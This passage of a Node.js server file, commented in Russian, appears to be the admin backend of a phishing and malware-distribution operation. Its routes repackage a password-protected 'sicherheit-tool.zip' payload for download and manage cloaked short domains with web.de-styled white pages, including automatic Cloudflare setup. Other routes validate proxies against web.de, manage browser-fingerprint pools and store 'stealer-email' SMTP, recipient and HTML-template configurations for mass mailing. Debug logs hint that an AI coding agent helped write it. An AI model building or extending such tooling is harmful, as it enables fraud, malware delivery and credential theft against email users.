            return s || null;
          }
          for (const r of renameList) {
            const from = safeSegment(r.from || r[0] || '');
            const to = safeSegment(r.to || r[1] || '');
            if (!from || !to || from === to) continue;
            const oldP = path.join(tempDir, from);
            const newP = path.join(tempDir, to);
            if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
            if (fs.existsSync(oldP)) fs.renameSync(oldP, newP);
          }
          const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
          execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
          const finalPath = path.join(DOWNLOADS_DIR, newZipName);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(outZipPath, finalPath);
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          writeZipPassword(newPassword);
          try {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
            if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
          } catch (e) {}
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: newZipName });
        } else if (useSlot) {
          const finalFileName = slotFileName(slotIndex);
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          fs.copyFileSync(sourcePath, path.join(DOWNLOADS_DIR, finalFileName));
          const config = readDownloadFilesConfig();
          config[slotIndex] = finalFileName;
          writeDownloadFilesConfig(config);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: finalFileName });
        } else {
          if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
          const names = fs.readdirSync(DOWNLOADS_DIR);
          for (let i = 0; i < names.length; i++) {
            const n = names[i];
            const lower = n.toLowerCase();
            if (lower.endsWith('.exe') || lower.endsWith('.zip')) {
              try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
            }
          }
          const finalPath = path.join(DOWNLOADS_DIR, safeName);
          fs.copyFileSync(sourcePath, finalPath);
          try {
            if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
            delete meta[checkId];
            writeCheckMeta(meta);
          } catch (e) {}
          send(res, 200, { ok: true, fileName: safeName });
        }
        try {
          if (fs.existsSync(sourcePath)) fs.unlinkSync(sourcePath);
          delete meta[checkId];
          writeCheckMeta(meta);
        } catch (e) {}
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip';
        }
        send(res, 500, { ok: false, error: friendly });
      }
    });
    return;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = short.listShortLinks().map(function (o) { return { slug: o.code, url: o.url }; });
    return send(res, 200, { shortlinks: list });
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const slug = (json.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
      const url = (json.url || '').trim();
      if (!slug || !url) return send(res, 400, { ok: false, error: 'slug and url required' });
      const result = short.createShortLinkWithCode(slug, url);
      if (!result) return send(res, 400, { ok: false, error: 'invalid slug or url' });
      send(res, 200, { ok: true, slug: result.code, shortUrl: '/s/' + result.code });
    });
    return;
  }

  if (pathname === '/api/config/shortlinks' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const slug = (parsed.query.slug || '').trim().replace(/[^a-zA-Z0-9_-]/g, '');
    if (!slug) return send(res, 400, { ok: false, error: 'slug required' });
    if (!short.deleteShortLink(slug)) return send(res, 404, { ok: false, error: 'not found' });
    send(res, 200, { ok: true });
    return;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const list = readShortDomains();
    const arr = Object.keys(list).map(function (d) {
      const o = list[d];
      return { domain: d, targetUrl: o.targetUrl || '', whitePageStyle: o.whitePageStyle || '', status: o.status || 'pending', message: o.message || '', ns: o.ns || [] };
    });
    return send(res, 200, { list: arr, serverIp: process.env.SHORT_SERVER_IP || '' });
  }

  if (pathname === '/api/config/short-domains' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      let domain = (json.domain || '').trim().toLowerCase().replace(/^https?:\/\//, '').split('/')[0].replace(/^www\./, '');
      const targetUrl = (json.targetUrl || '').trim();
      const whitePageStyle = (json.whitePageStyle || '').trim() === 'news-webde' ? 'news-webde' : '';
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const list = readShortDomains();
      const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
      const cfToken = (process.env.CLOUDFLARE_API_TOKEN || '').trim();
      const existing = list[domain];
      const entry = existing
        ? Object.assign({}, existing, { targetUrl: targetUrl || existing.targetUrl || '', whitePageStyle: whitePageStyle || existing.whitePageStyle || '' })
        : { targetUrl: targetUrl || '', whitePageStyle: whitePageStyle, status: 'pending', message: '', ns: [], createdAt: new Date().toISOString() };
      if (existing) {
        list[domain] = entry;
        writeShortDomains(list);
        return send(res, 200, { ok: true, domain: domain, status: entry.status || 'pending', message: entry.message || '' });
      }
      if (cfToken && serverIp) {
        addShortDomainToCloudflare(domain, serverIp, cfToken, function (err, ns) {
          if (err) {
            entry.status = 'error';
            entry.message = err.message || 'Cloudflare error';
            list[domain] = entry;
            writeShortDomains(list);
            return send(res, 200, { ok: true, domain: domain, status: 'error', message: entry.message, list: list });
          }
          entry.ns = ns || [];
          entry.message = ns && ns.length ? 'В Dynadot укажите NS: ' + ns.join(', ') : '';
          list[domain] = entry;
          writeShortDomains(list);
          send(res, 200, { ok: true, domain: domain, status: 'pending', ns: entry.ns, message: entry.message });
        });
      } else {
        entry.message = serverIp ? 'Добавьте домен в Cloudflare, A запись на ' + serverIp + ', в Dynadot укажите NS Cloudflare.' : 'Укажите SHORT_SERVER_IP и CLOUDFLARE_API_TOKEN в .env для автодобавления в CF.';
        list[domain] = entry;
        writeShortDomains(list);
        send(res, 200, { ok: true, domain: domain, status: 'pending', message: entry.message, serverIp: serverIp || '' });
      }
    });
    return;
  }

  if (pathname === '/api/config/short-domains-check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const domain = (json.domain || '').trim().toLowerCase().split('/')[0];
      if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
      const list = readShortDomains();
      if (!list[domain]) return send(res, 404, { ok: false, error: 'domain not in list' });
      const serverIp = (process.env.SHORT_SERVER_IP || '').trim();
      if (!serverIp) return send(res, 200, { ok: false, status: 'error', message: 'SHORT_SERVER_IP не задан' });
      dns.resolve4(domain, function (err, addresses) {
        if (err || !addresses || addresses.length === 0) {
          list[domain].status = 'error';
          list[domain].message = err ? (err.code || err.message) : 'DNS не резолвится';
          writeShortDomains(list);
          return send(res, 200, { ok: true, domain: domain, status: 'error', message: list[domain].message });
        }
        const match = addresses.some(function (a) { return a === serverIp; });
        list[domain].status = match ? 'ready' : 'error';
        list[domain].message = match ? '' : 'IP домена ' + addresses[0] + ' не совпадает с сервером ' + serverIp;
        writeShortDomains(list);
        send(res, 200, { ok: true, domain: domain, status: list[domain].status, message: list[domain].message });
      });
    });
    return;
  }

  if (pathname === '/api/config/short-domains' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const domain = (parsed.query.domain || '').trim().toLowerCase().split('/')[0];
    if (!domain) return send(res, 400, { ok: false, error: 'domain required' });
    const list = readShortDomains();
    if (!(domain in list)) return send(res, 404, { ok: false, error: 'not found' });
    delete list[domain];
    writeShortDomains(list);
    send(res, 200, { ok: true });
    return;
  }

  if (pathname === '/api/config/zip-password' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, { password: readZipPassword() });
  }

  if (pathname === '/api/config/zip-password' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const password = json.password != null ? String(json.password) : '';
      writeZipPassword(password);
      send(res, 200, { ok: true });
    });
    return;
  }

  /** Нормализация строки прокси: принимает http(s)://, socks5://, разделители : ; | tab. Всегда возвращает host:port:login:password (login/password пустые если не указаны). */
  function normalizeProxyLine(raw) {
    const s = String(raw || '').trim();
    if (!s) return null;
    let rest = s.replace(/^\s*(https?|socks5?|socks4?):\/\/\s*/i, '').trim();
    let parts = rest.split(':', 4);
    const portNum = (p) => { const n = parseInt(String(p || '').trim(), 10); return (n >= 1 && n <= 65535) ? n : NaN; };
    if (parts.length >= 2 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
    }
    parts = rest.split(/[;\t|]+/);
    if (parts.length >= 2 && parts.length <= 4 && !isNaN(portNum(parts[1]))) {
      const host = (parts[0] || '').trim();
      const port = portNum(parts[1]);
      const login = (parts[2] || '').trim();
      const password = (parts[3] || '').trim();
      if (host) return { host, port, login, password, normalized: host + ':' + port + ':' + login + ':' + password };
    }
    return null;
  }

  if (pathname === '/api/config/proxies' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const webdeProbeJobId = (q.webdeProbeJobId != null && String(q.webdeProbeJobId).trim()) ? String(q.webdeProbeJobId).trim() : '';
    if (webdeProbeJobId) {
      return sendWebdeFingerprintProbeStatus(res, webdeProbeJobId);
    }
    let content = '';
    try {
      if (fs.existsSync(PROXY_FILE)) content = fs.readFileSync(PROXY_FILE, 'utf8');
    } catch (e) {}
    const webdeFp = q.webdeFp === '1' || q.webdeFp === 'true' || q.webdeFp === 'yes';
    if (webdeFp) {
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      // #region agent log
      try {
        fs.appendFileSync(
          '/root/.cursor/debug-461acb.log',
          `${JSON.stringify({
            sessionId: '461acb',
            hypothesisId: 'H6',
            location: 'server.js:proxies-GET-webdeFp',
            message: 'webdeFp bundle',
            data: {
              poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1,
              filePresent: !!poolPayload.filePresent,
            },
            timestamp: Date.now(),
          })}\n`,
          'utf8'
        );
      } catch (eLog) {}
      // #endregion
      return send(res, 200, {
        content,
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
    return send(res, 200, { content });
  }

  if (pathname === '/api/config/proxies' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const hasIndicesOnly = Object.prototype.hasOwnProperty.call(json, 'webdeIndicesContent');
      if (hasIndicesOnly) {
        const indicesC = json.webdeIndicesContent != null ? String(json.webdeIndicesContent) : '';
        try {
          const dir = path.dirname(WEBDE_FP_INDICES_FILE);
          if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
          fs.writeFileSync(WEBDE_FP_INDICES_FILE, indicesC, 'utf8');
          const lineCount = indicesC.split(/\r?\n/).filter(function (l) {
            const t = (l || '').trim();
            return t.length > 0 && !t.startsWith('#');
          }).length;
          console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt (via /api/config/proxies): ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
        } catch (e) {
          return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
        }
        if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
          return send(res, 200, { ok: true });
        }
      }
      const content = json.content != null ? String(json.content) : '';
      if (!Object.prototype.hasOwnProperty.call(json, 'content')) {
        return send(res, 400, { ok: false, error: 'content required for proxy save' });
      }
      try {
        const dir = path.dirname(PROXY_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(PROXY_FILE, content, 'utf8');
        const lineCount = content.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён proxy.txt: ' + PROXY_FILE + ', непустых строк: ' + lineCount);
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write proxy file' });
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const probeJobId = (q.probeJobId != null && String(q.probeJobId).trim()) ? String(q.probeJobId).trim() : '';
    if (probeJobId) {
      return sendWebdeFingerprintProbeStatus(res, probeJobId);
    }
    let content = '';
    try {
      if (fs.existsSync(WEBDE_FP_INDICES_FILE)) content = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
    } catch (e) {}
    const poolPayload = buildWebdeFingerprintsListPayload();
    // #region agent log
    try {
      fs.appendFileSync(
        '/root/.cursor/debug-461acb.log',
        `${JSON.stringify({
          sessionId: '461acb',
          hypothesisId: 'H1',
          location: 'server.js:webde-fingerprint-indices-GET',
          message: 'sending content+pool',
          data: {
            poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1,
            filePresent: !!poolPayload.filePresent,
            parseError: poolPayload.parseError || null,
            contentLen: (content || '').length,
          },
          timestamp: Date.now(),
        })}\n`,
        'utf8'
      );
    } catch (eLog) {}
    // #endregion
    return send(res, 200, {
      content,
      pool: poolPayload,
    });
  }

  if (pathname === '/api/config/webde-fingerprint-indices' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (json.probePause === true || json.probePause === 'true' || json.probePause === 1) {
        return handleWebdeFingerprintProbePause(res, json);
      }
      if (json.probeResume === true || json.probeResume === 'true' || json.probeResume === 1) {
        return handleWebdeFingerprintProbeResume(res, json);
      }
      if (json.probeStart === true || json.probeStart === 'true' || json.probeStart === 1) {
        return handleWebdeFingerprintProbeStart(res, json);
      }
      const content = json.content != null ? String(json.content) : '';
      try {
        const dir = path.dirname(WEBDE_FP_INDICES_FILE);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(WEBDE_FP_INDICES_FILE, content, 'utf8');
        const lineCount = content.split(/\r?\n/).filter(function (l) {
          const t = (l || '').trim();
          return t.length > 0 && !t.startsWith('#');
        }).length;
        console.log('[CONFIG] Сохранён webde_fingerprint_indices.txt: ' + WEBDE_FP_INDICES_FILE + ', строк: ' + lineCount);
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Failed to write fingerprint indices file' });
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/config/webde-fingerprints-list' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, buildWebdeFingerprintsListPayload());
  }

  if (pathname === '/api/config/webde-fingerprint-probe-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      return handleWebdeFingerprintProbeStart(res, json);
    });
    return;
  }

  if (pathname === '/api/config/webde-fingerprint-probe-status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const jobId = (q.jobId != null && String(q.jobId).trim()) ? String(q.jobId).trim() : '';
    return sendWebdeFingerprintProbeStatus(res, jobId);
  }

  /** Только выдача пула отпечатков + индексов (без проверки прокси). GET + query — если POST-тело режется прокси. */
  if (pathname === '/api/config/proxies-validate' && req.method === 'GET') {
    const q = (parsed && parsed.query) || {};
    if (q.webdeFpBundle === '1' || q.webdeFpBundle === 'true' || q.webdeFpBundle === 'yes') {
      if (!checkAdminAuth(req, res)) return;
      let indicesContent = '';
      try {
        if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
      } catch (e) {}
      const poolPayload = buildWebdeFingerprintsListPayload();
      // #region agent log
      try {
        fs.appendFileSync(
          '/root/.cursor/debug-461acb.log',
          `${JSON.stringify({
            sessionId: '461acb',
            hypothesisId: 'H9',
            location: 'server.js:proxies-validate-GET-webdeFpBundle',
            message: 'GET bundle',
            data: { poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1 },
            timestamp: Date.now(),
          })}\n`,
          'utf8'
        );
      } catch (eLog) {}
      // #endregion
      return send(res, 200, {
        valid: [],
        invalid: [],
        webdeIndices: { content: indicesContent, pool: poolPayload },
      });
    }
  }

  /** Проверка прокси: сначала TCP, при отказе — HTTPS через прокси (реальный запрос). */
  if (pathname === '/api/config/proxies-validate' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const pq = (parsed && parsed.query) || {};
      const content = json.content != null ? String(json.content) : '';
      const lines = content.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
      const valid = [];
      const invalid = [];
      const timeoutMs = Math.min(15000, Math.max(3000, parseInt(json.timeoutMs, 10) || 8000));
      const testUrl = 'https://www.web.de/';

      function testProxyTcp(parsed) {
        return new Promise((resolve) => {
          const socket = net.createConnection(parsed.port, parsed.host, () => {
            socket.destroy();
            resolve({ ok: true });
          });
          socket.setTimeout(Math.min(timeoutMs, 5000));
          socket.on('timeout', () => {
            socket.destroy();
            resolve({ ok: false, error: 'Таймаут TCP' });
          });
          socket.on('error', (err) => {
            resolve({ ok: false, error: (err && err.message) || 'Ошибка подключения' });
          });
        });
      }

      function buildProxyUrl(parsed) {
        const enc = (s) => encodeURIComponent(String(s || ''));
        if (parsed.login || parsed.password) {
          return 'http://' + enc(parsed.login) + ':' + enc(parsed.password) + '@' + parsed.host + ':' + parsed.port;
        }
        return 'http://' + parsed.host + ':' + parsed.port;
      }

      function testProxyHttps(parsed) {
        return new Promise((resolve) => {
          if (!HttpsProxyAgent) {
            resolve({ ok: false, error: 'Модуль https-proxy-agent не установлен' });
            return;
          }
          const proxyUrl = buildProxyUrl(parsed);
          const agent = new HttpsProxyAgent(proxyUrl, { timeout: timeoutMs });
          const reqOpts = url.parse(testUrl);
          reqOpts.agent = agent;
          reqOpts.timeout = timeoutMs;
          const reqHttps = https.get(reqOpts, (resHttps) => {
            resHttps.destroy();
            resolve({ ok: true });
          });
          reqHttps.on('error', (err) => {
            resolve({ ok: false, error: (err && err.message) || 'Ошибка HTTPS через прокси' });
          });
          reqHttps.setTimeout(timeoutMs, () => {
            reqHttps.destroy();
            resolve({ ok: false, error: 'Таймаут HTTPS' });
          });
        });
      }

      const includeWebdeFpBundle =
        pq.webdeFpBundle === '1' ||
        pq.webdeFpBundle === 'true' ||
        pq.webdeFpBundle === 'yes' ||
        json.includeWebdeFpBundle === true ||
        json.includeWebdeFpBundle === 'true' ||
        json.includeWebdeFpBundle === 1;

      (async () => {
        for (const line of lines) {
          if (line.startsWith('#')) continue;
          const parsed = normalizeProxyLine(line);
          if (!parsed) {
            invalid.push({ line, error: 'Неверный формат (нужно host:port или host:port:login:password, разделители : ; |)' });
            continue;
          }
          let result = await testProxyTcp(parsed);
          if (!result.ok && HttpsProxyAgent) {
            result = await testProxyHttps(parsed);
          }
          if (result.ok) valid.push({ line, normalized: parsed.normalized });
          else invalid.push({ line, error: result.error, normalized: parsed.normalized });
        }
        const out = { valid, invalid };
        if (includeWebdeFpBundle) {
          let indicesContent = '';
          try {
            if (fs.existsSync(WEBDE_FP_INDICES_FILE)) indicesContent = fs.readFileSync(WEBDE_FP_INDICES_FILE, 'utf8');
          } catch (e) {}
          const poolPayload = buildWebdeFingerprintsListPayload();
          out.webdeIndices = { content: indicesContent, pool: poolPayload };
          // #region agent log
          try {
            fs.appendFileSync(
              '/root/.cursor/debug-461acb.log',
              `${JSON.stringify({
                sessionId: '461acb',
                hypothesisId: 'H8',
                location: 'server.js:proxies-validate-includeWebdeFpBundle',
                message: 'bundle attached',
                data: { poolEntryCount: Array.isArray(poolPayload.entries) ? poolPayload.entries.length : -1 },
                timestamp: Date.now(),
              })}\n`,
              'utf8'
            );
          } catch (eLog) {}
          // #endregion
        }
        return send(res, 200, out);
      })();
    });
    return;
  }

  if (pathname === '/api/config/zip-process' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const sourceFileName = path.basename((json.sourceFileName || '').trim().replace(/\0/g, '').replace(/\.\./g, ''));
      const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
      const newPassword = json.newPassword != null ? String(json.newPassword) : '';
      let newZipName = (json.newZipName || '').trim().replace(/[^a-zA-Z0-9._-]/g, '') || 'sicherheit-tool.zip';
      if (!newZipName.toLowerCase().endsWith('.zip')) newZipName += '.zip';
      const renames = json.renames && typeof json.renames === 'object' ? json.renames : {};
      const sourcePath = path.join(DOWNLOADS_DIR, sourceFileName);
      if (!sourceFileName || !fs.existsSync(sourcePath) || path.extname(sourcePath).toLowerCase() !== '.zip') {
        return send(res, 400, { ok: false, error: 'Source zip not found or not a zip' });
      }
      const tempDir = path.join(os.tmpdir(), 'gmw-zip-' + Date.now());
      const outZipPath = path.join(os.tmpdir(), 'gmw-out-' + Date.now() + '.zip');
      try {
        fs.mkdirSync(tempDir, { recursive: true });
        const envOld = { ...process.env, GMW_ZIP_OLD: currentPassword };
        const unzipCmd = 'unzip -P "$GMW_ZIP_OLD" -o ' + JSON.stringify(sourcePath) + ' -d ' + JSON.stringify(tempDir);
        const unzipRun = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', unzipCmd], { encoding: 'utf8', env: envOld });
        const extracted = fs.readdirSync(tempDir).length > 0;
        if (!extracted) {
          const errMsg = (unzipRun.stderr || unzipRun.stdout || '').toString().trim();
          const friendly = /wrong password|incorrect password|bad password|пароль/i.test(errMsg) ? 'Неверный пароль от архива.' : 'Не удалось распаковать архив. Проверьте пароль.';
          return send(res, 500, { ok: false, error: friendly });
        }
        const renameList = Array.isArray(renames) ? renames : Object.entries(renames).map(([k, v]) => ({ from: k, to: v }));
        function safeSegment(name) {
          const s = (name || '').replace(/\.\./g, '').replace(/^[/\\]+/, '');
          return s || null;
        }
        for (const r of renameList) {
          const from = safeSegment(r.from || r[0] || '');
          const to = safeSegment(r.to || r[1] || '');
          if (!from || !to || from === to) continue;
          const oldP = path.join(tempDir, from);
          const newP = path.join(tempDir, to);
          if (path.relative(tempDir, oldP).startsWith('..') || path.relative(tempDir, newP).startsWith('..')) continue;
          if (fs.existsSync(oldP)) {
            fs.renameSync(oldP, newP);
          }
        }
        const envNew = { ...process.env, GMW_ZIP_NEW: newPassword };
        execSync('cd ' + JSON.stringify(tempDir) + ' && zip -r -P "$GMW_ZIP_NEW" ' + JSON.stringify(outZipPath) + ' .', { shell: true, env: envNew });
        const finalPath = path.join(DOWNLOADS_DIR, newZipName);
        fs.copyFileSync(outZipPath, finalPath);
        const names = fs.readdirSync(DOWNLOADS_DIR);
        for (let i = 0; i < names.length; i++) {
          const n = names[i];
          const lower = n.toLowerCase();
          if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== newZipName) {
            try { fs.unlinkSync(path.join(DOWNLOADS_DIR, n)); } catch (e) {}
          }
        }
        writeZipPassword(newPassword);
        send(res, 200, { ok: true, fileName: newZipName });
      } catch (e) {
        const msg = (e.stderr && e.stderr.toString()) || e.message || String(e);
        let friendly = msg.length > 80 ? 'Ошибка при обработке архива.' : msg;
        if (/zip:\s*not found|command not found.*zip/i.test(msg)) {
          friendly = 'На сервере не установлена программа zip. Установите: apt install zip (или yum install zip)';
        }
        send(res, 500, { ok: false, error: friendly });
      } finally {
        try {
          if (fs.existsSync(tempDir)) {
            const left = fs.readdirSync(tempDir);
            for (const f of left) fs.unlinkSync(path.join(tempDir, f));
            fs.rmdirSync(tempDir);
          }
          if (fs.existsSync(outZipPath)) fs.unlinkSync(outZipPath);
        } catch (e) {}
      }
    });
    return;
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readStealerEmailConfig();
    const cur = data.current;
    const out = {
      list: (data.configs || []).map(function (c) { return { id: c.id, name: c.name || c.id }; }),
      currentId: data.currentId || null,
      smtpLine: (cur && cur.smtpLine) || '',
      recipientsList: (cur && cur.recipientsList) || '',
      html: (cur && cur.html) || '',
      image1Present: !!(cur && cur.image1Base64),
      senderName: (cur && cur.senderName) || '',
      title: (cur && cur.title) || ''
    };
    return send(res, 200, out);
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const data = readStealerEmailConfig();
      const configs = data.configs || [];
      let configId = (json.id != null && json.id !== '') ? String(json.id).trim() : null;
      let cfg = configId ? configs.find(function (c) { return c.id == configId; }) : null;
      if (!cfg) {
        configId = 'cfg-' + Date.now() + '-' + Math.random().toString(36).slice(2, 9);
        cfg = { id: configId, name: (json.name && String(json.name).trim()) || 'New', smtpLine: '', html: '', senderName: '', title: '' };
        configs.push(cfg);
      }
      if (json.name != null) cfg.name = String(json.name).trim() || cfg.name;
      if (json.smtpLine != null) cfg.smtpLine = String(json.smtpLine).trim();
      if (json.recipientsList != null) cfg.recipientsList = String(json.recipientsList);
      if (json.senderName != null) cfg.senderName = String(json.senderName).trim();
      if (json.title != null) cfg.title = String(json.title).trim();
      if (json.html != null) cfg.html = String(json.html);
      if (json.templateBase64 != null) {
        try { cfg.html = Buffer.from(String(json.templateBase64), 'base64').toString('utf8'); } catch (e) {}
      }
      if (json.image1Base64 != null) {
        const b64 = String(json.image1Base64).trim();
        if (b64) cfg.image1Base64 = b64; else delete cfg.image1Base64;
      }
      if (json.setCurrent === true) data.currentId = cfg.id;
      data.configs = configs;
      data.current = cfg;
      writeStealerEmailConfig(data);
      sendStealerFailedSmtpEmails.clear();
      return send(res, 200, { ok: true, id: configId });
    });
    return;
  }

  if (pathname === '/api/config/stealer-email' && req.method === 'DELETE') {
    if (!checkAdminAuth(req, res)) return;
    const id = (parsed.query && parsed.query.id) ? String(parsed.query.id).trim() : '';
    if (!id) return send(res, 400, { ok: false, error: 'id required' });
    const data = readStealerEmailConfig();
    const configs = (data.configs || []).filter(function (c) { return c.id != id; });
    if (configs.length === (data.configs || []).length) return send(res, 404, { ok: false, error: 'Config not found' });
    const newCurrent = data.currentId == id ? (configs[0] && configs[0].id) || null : data.currentId;
    data.configs = configs;
    data.currentId = newCurrent;
    data.current = configs.find(function (c) { return c.id == newCurrent; }) || configs[0] || null;
    writeStealerEmailConfig(data);
    return send(res, 200, { ok: true });
  }

  if (pathname === '/api/config/stealer-email/select' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      const data = readStealerEmailConfig();
      const cfg = (data.configs || []).find(function (c) { return c.id == id; });
      if (!cfg) return send(res, 404, { ok: false, error: 'Config not found' });
      data.currentId = cfg.id;
      data.current = cfg;
      writeStealerEmailConfig(data);
      return send(res, 200, { ok: true });
    });
    return;
  }

